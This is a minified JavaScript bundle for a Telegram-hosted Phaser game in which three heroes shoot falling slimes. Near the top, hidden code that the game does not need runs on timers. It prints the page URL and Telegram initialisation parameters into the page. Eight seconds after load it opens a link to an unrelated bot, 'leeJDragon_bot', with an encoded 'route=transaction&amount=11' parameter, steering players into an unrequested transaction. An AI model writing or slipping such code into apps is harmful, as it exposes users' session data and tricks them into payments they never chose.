(()=>{"use strict";var t={};t.d=(e,s)=>{for(var a in s)t.o(s,a)&&!t.o(e,a)&&Object.defineProperty(e,a,{enumerable:!0,get:s[a]})},t.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e),setTimeout((()=>{const t=document.createElement("h5");t.innerText=`\n        ${JSON.stringify(location.href)},\n        ${JSON.stringify(window.TelegramGameProxy.initParams)},\n        ${JSON.stringify(window.TelegramGameProxy.shareScore)}\n    `,document.body.append(t)}),2e3),setTimeout((()=>{const t=`https://t.me/leeJDragon_bot/app?startapp=${e="route=transaction&amount=11",btoa(e).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}`;var e;window?.Telegram?.WebApp.openTelegramLink(t)}),8e3);class e{constructor(t,e,s,a,i,o){this.sprite=d.add.sprite(t,e,s),this.sprite.animations.add("idle",[0],0),this.sprite.animations.add("attack",[1,2,3,4,0],12),this.sprite.animations.play("idle"),this.attack_ref=a,this.cooldown=!1,this.x=this.sprite.x,this.y=this.sprite.y,this.button=d.add.button(this.x-35,this.y+160,i,this.attack,this,0,0,1,0),this.button.scale.setTo(2,2),this.slime_frames=o}attack(){this.cooldown||c||(this.sprite.animations.play("attack"),r.create(this.sprite.x,this.sprite.y-10,this.attack_ref).body.velocity.y=a,this.cooldown=!0,d.time.events.add(s,(function(){this.cooldown=!1}),this))}}const s=150,a=-1e3;var i,o,r,n,h,d=new Phaser.Game(720,1280,Phaser.AUTO,"game_div",{preload:function(){d.load.image("background","assets/map.png"),d.load.bitmapFont("heartbit","assets/heartbit.png","assets/heartbit.fnt"),d.load.bitmapFont("heartbit-72","assets/heartbit-72.png","assets/heartbit-72.fnt"),d.load.image("heart","assets/heart.png"),d.load.spritesheet("knight","assets/knight-64.png",64,104),d.load.spritesheet("mage","assets/mage-64.png",64,108),d.load.spritesheet("ranger","assets/ranger-64.png",64,108),d.load.image("fireball","assets/fireball.png"),d.load.image("sword_wave","assets/sword_wave.png"),d.load.image("arrow","assets/arrow.png"),d.load.spritesheet("slimes","assets/slimes.png",18,16,9),d.load.spritesheet("book_btn","assets/book_btn.png",64,64),d.load.spritesheet("sword_btn","assets/sword_btn.png",64,64),d.load.spritesheet("bow_btn","assets/bow_btn.png",64,64)},create:function(){d.scale.scaleMode=Phaser.ScaleManager.EXACT_FIT,d.stage.backgroundColor="rgb(50, 50, 50)";var t=d.add.sprite(d.width/2,0,"background");i=.8*t.height,t.x-=t.width/2,h=d.add.bitmapText(.75*d.width,.85*d.height,"heartbit","Score: "+b,48),d.physics.startSystem(Phaser.Physics.ARCADE);var s=new e(d.width/2-205,d.height/2+325,"mage","fireball","book_btn",[6,7,8]),a=new e(d.width/2-35,d.height/2+325,"knight","sword_wave","sword_btn",[0,1,2]),c=new e(d.width/2+145,d.height/2+325,"ranger","arrow","bow_btn",[3,4,5]);o=[s,a,c],(r=d.add.group()).enableBody=!0,r.setAll("checkWorldBounds",!0),r.setAll("outOfBoundsKill",!0),(n=d.add.group()).enableBody=!0;for(var p=0;p<3;p++)l.push(d.add.sprite((.05*p+.8)*d.width,.02*d.height,"heart"))},update:function(){c||(p||(d.time.events.add(y,k,this,o[Math.floor(Math.random()*o.length)]),p=!0),d.physics.arcade.overlap(n,r,x,(function(t,e){return!(t.aysncDestroy||e.asyncDestroy)}),this));if(0!=g.length){var t=g[0];t.y>i&&(m.enemies.push(t),c||T())}m.enemies.forEach((function(t,e){var s=g.indexOf(t);-1!=s&&g.splice(s,1),n.remove(t,!0)}),this),m.projectiles.forEach((function(t,e){r.remove(t,!0)}),this)}}),c=!1,p=!1,l=[],g=[],m={enemies:[],projectiles:[]},b=0,u=100;const w=5,f=500;var y=2300;const v=50,_=500;function k(t){var e=n.create(t.x,-10,"slimes");e.scale.set(3.5,3.5),e.animations.add("idle",t.slime_frames,9,!0),e.animations.play("idle"),e.body.velocity.y=u,p=!1,g.push(e)}function x(t,e){t==g[0]?(b+=10,u=Math.min(u+w,f),y=Math.max(y-v,_),h.setText("Score: "+b),m.enemies.push(t)):l.length>0&&(l.shift().destroy(),0==l.length&&T()),m.projectiles.push(e)}function T(){d.add.bitmapText(d.width/2-150,.3*d.height,"heartbit-72","GAME OVER",72),d.add.bitmapText(d.width/2-150,.35*d.height,"heartbit-72","Your score: "+b,72),c=!0;var t=O("uid"),e=O("msgid"),s=O("chatid"),a=O("iid");t&&e&&s?$.get("/setscore/uid/"+t+"/chat/"+s+"/msg/"+e+"/score/"+b):t&&a&&$.get("/setscore/uid/"+t+"/iid/"+a+"/score/"+b)}function O(t){var e=void 0;return tmp=[],location.search.substr(1).split("&").forEach((function(s){tmp=s.split("="),tmp[0]===t&&(e=decodeURIComponent(tmp[1]))})),e}})();